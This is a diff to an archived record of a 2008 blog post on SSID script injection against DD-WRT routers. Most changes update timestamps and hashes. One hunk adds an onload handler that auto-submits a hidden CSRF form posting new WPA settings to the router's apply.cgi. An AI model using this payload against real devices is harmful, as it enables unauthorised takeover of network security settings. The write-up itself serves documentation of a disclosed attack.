@@ -6,9 +6,9 @@ resource: "http://usefulfor.com/security/2008/08/04/ssid-script-injection/"
 tags: [article, webseclist-reference, usefulfor-com, xss, injection, csrf, attack-chain, filter-bypass, tooling, owasp-a01-2021, owasp-a03-2021, owasp-a05-2021]
 generated:
   by: webseclist-refs/1
-  at: "2026-08-09T10:26:36+00:00"
+  at: "2026-08-16T00:01:20+00:00"
 status: deprecated
-stale_after: 2027-08-09
+stale_after: 2027-08-16
 sources:
   - id: original
     resource: "http://usefulfor.com/security/2008/08/04/ssid-script-injection/"
@@ -21,7 +21,7 @@ canonical_url: ""
 cited_by:
   - "2008.md:61"
 commit: ""
-content_sha256: 56941ed5946b77de4084f0496fe43eac90d0f9dd97cdff5f56f3a04fd47900ba
+content_sha256: ce2c6c257fa18e1cdd661dde310ca54a534a0d59c4310aff8919aefe2bd7b80a
 depth: full
 depth_reason: default
 kind: article
@@ -34,7 +34,7 @@ publisher_english: ""
 raw_sha256: 68dee522864dad4fa4e8a09a263e4914546ab780da136339ef34dde73e4aa5a0
 retrieved_from: "http://usefulfor.com/security/2008/08/04/ssid-script-injection/"
 retrieved_kind: stored
-retrieved_utc: "2026-08-09T10:26:36+00:00"
+retrieved_utc: "2026-08-16T00:01:20+00:00"
 slug: usefulfor-com-usefulfor-com-security-blog-archive-ssid-script-injection
 snapshot: 20090106155604
 title_english: ""
@@ -48,7 +48,7 @@ translation_of: ""
 
 - Published: date not stated
 - Original: <http://usefulfor.com/security/2008/08/04/ssid-script-injection/>
-- Preserved from: http://usefulfor.com/security/2008/08/04/ssid-script-injection/ (stored) on 2026-08-09
+- Preserved from: http://usefulfor.com/security/2008/08/04/ssid-script-injection/ (stored) on 2026-08-16
 - Capture timestamp: 20090106155604
 - Licence: unknown
 
@@ -115,7 +115,7 @@ A malicious SSID combined together with the use of JavaScript comment tags (/* *
 3. The malicious payload references to a script hosted in the attacker’s web server. Below it can be seen an example of the malicious script hosted in the attacker’s web server. This code will vary depending on the affected device.
 
 `<html>
- <body >
+ <body onload="javascript:document.forms.wpa.submit();">
  <form name="wpa" action="http://192.168.1.1/**apply.cgi**” method=”POST”>
  <input type=”hidden” name=”submit_button” value=”WL_WPATable” />
  <input type=”hidden” name=”action” value=”ApplyTake” />
@@ -141,3 +141,20 @@ A malicious SSID combined together with the use of JavaScript comment tags (/* *
 ** Demo:** DD-WRT SSID Script Injection Attack [[1]](http://www.mwrinfosecurity.com/publications/dd-wrt.htm)
 
 **White paper:** Behind Enemy Lines [[1]](http://www.mwrinfosecurity.com/publications/mwri_behind-enemy-lines_2008-07-25.pdf) [[2]](http://usefulfor.com/security/files/2008/08/mwri_behind-enemy-lines_2008-07-25.pdf)
+
+  **Share and Enjoy:** These icons link to social bookmarking sites where readers can share and discover new web pages.
+
+- [![Digg](http://usefulfor.com/security/wp-content/plugins/sociable/images/digg.png)](http://digg.com/submit?phase=2&url=http%3A%2F%2Fusefulfor.com%2Fsecurity%2F2008%2F08%2F04%2Fssid-script-injection%2F&title=SSID+Script+Injection)
+- [![del.icio.us](http://usefulfor.com/security/wp-content/plugins/sociable/images/delicious.png)](http://del.icio.us/post?url=http%3A%2F%2Fusefulfor.com%2Fsecurity%2F2008%2F08%2F04%2Fssid-script-injection%2F&title=SSID+Script+Injection)
+- [![Slashdot](http://usefulfor.com/security/wp-content/plugins/sociable/images/slashdot.png)](http://slashdot.org/bookmark.pl?title=SSID+Script+Injection&url=http%3A%2F%2Fusefulfor.com%2Fsecurity%2F2008%2F08%2F04%2Fssid-script-injection%2F)
+- [![Technorati](http://usefulfor.com/security/wp-content/plugins/sociable/images/technorati.png)](http://technorati.com/faves?add=http%3A%2F%2Fusefulfor.com%2Fsecurity%2F2008%2F08%2F04%2Fssid-script-injection%2F)
+
+  This entry was posted on Monday, August 4th, 2008 at 11:41 am and is filed under [hack-fu](http://usefulfor.com/security/category/hack-fu/). You can follow any responses to this entry through the [RSS 2.0](http://usefulfor.com/security/2008/08/04/ssid-script-injection/feed/) feed. You can leave a response, or [trackback](http://usefulfor.com/security/2008/08/04/ssid-script-injection/trackback/) from your own site.
+
+### Leave a Reply
+
+ Name (required)
+
+ Mail (will not be published) (required)
+
+ Website
